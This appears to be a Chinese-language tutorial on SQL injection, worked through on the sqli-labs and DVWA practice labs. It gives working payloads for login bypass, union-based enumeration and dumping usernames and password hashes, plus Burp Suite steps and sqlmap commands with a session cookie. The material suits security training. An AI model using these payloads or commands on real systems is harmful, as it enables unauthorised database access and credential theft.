# sql注入

### sql注入简介

 Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一 。

### Sql注入原理

数据如注入漏洞，主要指的开发人员在构建代码的时候，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其执行，导致数据库泄露的一种漏洞

### 判断是否存在 Sql 注入漏洞

 通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：`http://xxx.xxx.xxx/abcd.php?id=XX` 

1.可控参数的改变是否影响页面显示结果

```
?id=1     
?id=2
```

2.最为经典的**单引号判断法**：
在参数后面加上单引号,比如: 

```cpp
http://xxx.xxx.xxx/abcd.php?id=4'
```

 如果页面返回错误，则存在 Sql 注入，原因是无论字符型还是整型都会因为单引号个数不匹配而报错

可通过添加注释%2判断是整型还是字符型：

以sqli-labs less 1为例子

输入`id=1'`,报错，说明此处可能存在注入

![1633530744471](https://i.loli.net/2021/10/07/akAGX5SIdWufQHc.png)

输入id=1'%23，发现页面显示正常

![1633531074888](https://i.loli.net/2021/10/07/qc5pb3SZlFYDKrm.png)

继续注入，id=1' and 1=1%23页面显示正常，id=1' and 1=2%23页面显示不正常

%23注释了后面的sql语句，闭合了sql语句中的单引号，由此可判断出为字符型（单引号）

### 注入流程

获取字段数→查库名→查表名→查列名→查数据

1.获取字段数：order by 获取 字段临界值

2.获取库名：database()

3.查询表名和列名：

查表名：

```
SELECT TABLE_NAME from information_schema.tables where TABLE_SCHEMA = dabatase() #数据库名
```

查列名：

```
SELECT COLUMN_NAME FROM information_schema.columns where TABLE_NAME ='users'
```

备注：information_schema数据库里有三个表是sql注入需要用到的

SCHEMATA 表 SCHEMA_NAME储存了所有数据库的名字

TABLES 表TABLE_SCHEMA和TABLE_NAME分别储存了所有的数据库名称以及所有数据库的表

COLUMNS表 TABLE_SCHEMA、TABLE_NAME 、COLUMN_NAME 分别储存了所有的数据库名称、所有数据库的表、表里所有的字段

### 常见的注入类型

数字型 user_id = $id

字符型 user_id ='$id'

### sql注入实例一：字符型（单引号）

 使用DVWA渗透测试平台，作为攻击测试的目标。

靶场地址：http://1.14.43.183:11081/login.php

1.输入1，查看回显（URL中ID=1，说明php页面通过get方法传递参数）

![1633507029482](https://i.loli.net/2021/10/07/cDeI3KASOZFGbzp.png)

2.点击view source查看源代码，查看后台执行的sql语句

![1633507227389](https://i.loli.net/2021/10/07/yeSIhgZW6LjDJnF.png)

3.可以看到，输入1的时候，实际执行的sql语句是：

```
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

输入`1' or 1=1#`：

返回这个表的全部数据，因为1=1恒定为真

![1633516048393](https://i.loli.net/2021/10/07/wdPygOEknNm8zW6.png)

4.通过控制参数id来返回我们需要的信息，输入框中输入1' order by 1#，查看返回的First name、Surname

![1633507650516](https://i.loli.net/2021/10/07/YKrd4aVzFtPN6kQ.png)

实际后台执行的sql语句变成：

 查询users表中user_id为1的数据并按第一字段排行 

```bash
SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#';
(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)
```

5.继续尝试输入 `1' order by 1#`和 `1' order by 2#` ，一直到`1' order by 3#` ， 当输入 `1' order by 3#`时，返回错误： 

![1633507984223](https://i.loli.net/2021/10/07/jBlwYtJeXn8s2QL.png)

由此可知，users表中只有两个字段，列数为2

6.使用union select联合查询继续获取信息

union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2

输入 `1' union select database(),1#`进行查询 

![1633517538951](https://i.loli.net/2021/10/07/3hYTOipyE1DrJqm.png)

- database()将会返回当前网站所使用的数据库名字

实际执行的sql语句：

```bash
SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),1#`;
```

我们成功获取到：

- 当前网站使用数据库为 dvwa

获取了数据库名dvwa后尝试获取数据库中的表名输入：

```
'1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#'
```

 mysql5.0后系统内置了information_schema数据库，information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等

  该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录存储的表名和表名所在的数据库 

![1633509769805](https://i.loli.net/2021/10/07/YGNdzKlMnZVtjpb.png)

实际执行的sql语句：

```csharp
ELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#`;
```

共获取到dvwa数据库的两个表，geuestbook以及users

接下来尝试获取用户名、密码，输入以下获取users表里的所有字段：

```
1' union select column_name,table_name from information_schema.columns where table_name = 'users' #
```

![1633517872147](https://i.loli.net/2021/10/07/Neb5d6ZE8S2flMB.png)

获取到有两个字段user,password是我们需要的，所以输入：`1' union select user,password from users#`进行查询 ：

![1633510187314](https://i.loli.net/2021/10/07/ObjtKx587nSTvPw.png)

 可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到`www.cmd5.com`进行解密 ，可以尝试是否能够登录成功



### sql注入实例二：整型注入

以sqli-labs less 2举例。

1.首先根据提示，输入`id=1`,查看回显

![1633524664616](https://i.loli.net/2021/10/07/nZusk6UV48HSoqT.png)

2.加上单引号，输入`id=1'` 页面返回错误，存在sql注入

![1633524744128](https://i.loli.net/2021/10/07/Z4r97lw8osOfjAh.png)

3.使用order by判断表字段的最大值 当输入`id=1 order by 4%23`，由此可知，该表有3个字段，为3列

![1633530288294](https://i.loli.net/2021/10/07/XWrKfq19pkDe7lg.png)

4.获取当前数据库，输入`id=12222 union select 1,2,database()%23`，由于页面显示限制，只显示第一行数据，输入id=12222使得前一条查询语句不显示（可以使用不存在的数或者加and 0）

![1633530314199](https://i.loli.net/2021/10/07/8nX1EecxIkTbofs.png)

5.获取当前数据库的所有表,输入以下： 

```text
id=1222 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

![1633530334370](https://i.loli.net/2021/10/07/kI2PAzYLDm8WG5c.png)

备注：group_concat()拼接所有列

6.获取我们想要users表的字段，输入以下,得到users表的字段为id,username,password：

```
id=1222 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'%23
```

![1633530354562](https://i.loli.net/2021/10/07/QSl2DXfo7uPzNaM.png)

7.获取username,password，输入以下：

```
id=12222 union select 1,group_concat(username),group_concat(password) from users%23
```

![1633530376447](https://i.loli.net/2021/10/07/qkSNl8b3ZVBaDzh.png)

可以使用concat_ws()将uername,password拼接展示：

```
id=121343 union select 1,group_concat(concat_ws(':',username,password)),3 from security.users%23
```

![1633530394700](https://i.loli.net/2021/10/07/kURNTxqgMFwB1sz.png)

### sql注入实例三：POST注入（登录绕过）

以sqli-labs less-11为例。

1.查看该网页html部分，获取到form表单采用post形式提交，需要提交passwd和uname两个参数

![image-20211007005445731](https://i.loli.net/2021/10/07/4LjYChHetETflUR.png)

2.可大致推断数据库的sql语句为

```
select username,password from users where uname=用户名&passwd=密码
```

3.在Less1-4中，我们正常访问需要 ?id=xxx而这里需要 uname=用户名&passwd=密码

同理：?id=1'       类似于 uname=1&passwd=1'，username输出1'，根据报错可知，还是字符型单引号注入

![image-20211007010321441](https://i.loli.net/2021/10/07/5Gl37swQaZLXecy.png)

4.username输入1' or 1#，登录成功，确定是一个注册点

![image-20211007010547170](https://i.loli.net/2021/10/07/EZ1B3HezCTSPG9D.png)

5.获取字段数，order by 在这里是行不通的，因为1' order by 1 数据库中根本没有用户名为1的用户（真的有当我没说），可以使用-1' union select 1,2# 使得前一个条件为false直接执行后面的select语句，结果返回用户名和密码可以确定字段数，username输入`-1' union select 1,2#`返回用户名和密码，username输入`-1' union select 1,2,3#`报错，可以确定字段数为2

![image-20211007011308470](https://i.loli.net/2021/10/07/SyXAFZE4v8iPLYJ.png)

6.获得当前数据库名，username输入`-1' union select 1,database()#`，当前数据库为security

![image-20211007011440900](https://i.loli.net/2021/10/07/eaiC2LhIr1P5l9g.png)

7.获取当前数据库所有的表，username输入`-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#`

![image-20211007011733506](https://i.loli.net/2021/10/07/dKiH6t9yWbQrnAz.png)

8.获取users表的字段，username输入`-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#`

![image-20211007012009476](https://i.loli.net/2021/10/07/kcd9ALjiUTtIHQ2.png)

9.`-1' union select group_concat(password),group_concat(username) from users#`获取用户名、密码

![image-20211007012213348](https://i.loli.net/2021/10/07/CuWtJKarBzoYMs1.png)

### 使用BurpSuite工具进行注入

**BurpSuite的核心是代理Proxy**，通常情况下使用BurpSuite的套路是：浏览器设置BurpSuite代理→访问Web应用程序→BurpSuite抓包分析

还是以sqli-labs less-11为例。

1.查看brupsuite默认代理，默认代理端口为8080，可能会和tomcat冲突，可以自行修改

![image-20211007115618655](https://i.loli.net/2021/10/07/FDVo4JR7wsaBKZC.png)

2.修改浏览器代理端口，这里使用的是Chrome

![image-20211007115758858](https://i.loli.net/2021/10/07/cvawVWKCygSJobl.png)

3.简单介绍burpsuite基本功能

![image-20211007120424375](https://i.loli.net/2021/10/07/Ne5D3iu6anLJASX.png)

4.在less-11username 输入框中输入1'进行测试，查看burpsuite的拦截

![image-20211007120818457](https://i.loli.net/2021/10/07/f5Y8dJEQnljKgu1.png)

5.修改注入点提交到服务器，可以看到页面已经显示了用户名和密码

![image-20211007121119623](https://i.loli.net/2021/10/07/ZNR3J9QYiKtcDUI.png)

![image-20211007120950123](https://i.loli.net/2021/10/07/3P8dDKsCM2rt6WX.png)

6.这样操作其实有点繁琐，可以将拦截到的包发送到Repter，每一次修改语句直接Go一次，右边会直接返回结果，不必每次修改语句就抓一次包

![image-20211007121247201](https://i.loli.net/2021/10/07/XBDpmQq3dvKyLHx.png)

![image-20211007121417635](https://i.loli.net/2021/10/07/5apt4smxERurNzj.png)

7.从返回的一部分语句中可以看出是字符型单引号注入，猜测查询语句为：

![image-20211007122311851](https://i.loli.net/2021/10/07/iKThIvAcymWXBob.png)

```
SELECT USERNAME,PASSWORD FROM TABLE_NAME WHERE USERNAME='$_POST['uname']' AND'$_POST['passwd']' limit 0,1
```

8.实际操作和示例三一样，首先使用union select判断字段数，再获取数据库名、表名、字段名

![image-20211007123006450](https://i.loli.net/2021/10/07/xQZzJso5Tb7ldG1.png)

![image-20211007123029831](https://i.loli.net/2021/10/07/h2oDP16MmzkV8Lt.png)

![image-20211007123058790](https://i.loli.net/2021/10/07/jPVKkgl6SZxHMhX.png)

![image-20211007123247279](https://i.loli.net/2021/10/07/RexonZPqak6cIzy.png)

![image-20211007123345273](https://i.loli.net/2021/10/07/RjegQW2rtYFPLoN.png)

![image-20211007123447169](https://i.loli.net/2021/10/07/6GmFIBqzT2WhUDp.png)

### 使用sqlmap进行自动化注入

#### sqlmap注入实例一：

以sqlib-labs less-1举例。

1.输入id=1',根据报错可判断出为字符型单引号注入

![image-20211008160913473](https://i.loli.net/2021/10/08/CK47QHk9tmLdYo1.png)

2.猜测sql语句大概为

`select password,username from 表名 where id = 参数 LIMIT 0,1`

2.-u参数，一共发现四种类型注入（-u #注入点）

`python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1"`

![image-20211008161812468](https://i.loli.net/2021/10/08/6bU37lwCRsiY8oE.png)

3. -dbs参数爆数据库获取到全部数据库，也可以用-current-db获取当前数据库名称
4. `python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -dbs`

![image-20211008162145241](https://i.loli.net/2021/10/08/n1dqXyN3SfTQrt7.png)

4. -tables参数爆表（-D 指定数据库名）

`python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -tables `

![image-20211008162504352](https://i.loli.net/2021/10/08/jAU1VPxCNnJWY2e.png)

5.-columns爆列（-T 指定表名）

`python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -T users -columns`

![image-20211008162707350](https://i.loli.net/2021/10/08/5RyImbrW3OLM4Qi.png)

6. -dump爆数据（-C 指定字段）

`python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -T users -C id,username,password -dump`

![image-20211008162857905](https://i.loli.net/2021/10/08/6Xo1Jr2HYBR3i4Z.png)

#### sqlmap注入实例二：

以DVWA为例。

1.DVWA是需要登录的，需要加上登录使用的cookie，由前面可知，注入点为`http://1.14.43.183:11081/vulnerabilities/sqli/?id=1&Submit=Submit#`

2.-u参数，加上--cookie

`python3 sqlmap.py -u "http://1.14.43.183:11081/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie=PHPSESSID=8l8ujegpqapm7jr5hqcpr5gck3;security=low`

3.接下来的步骤和实例一没什么区别

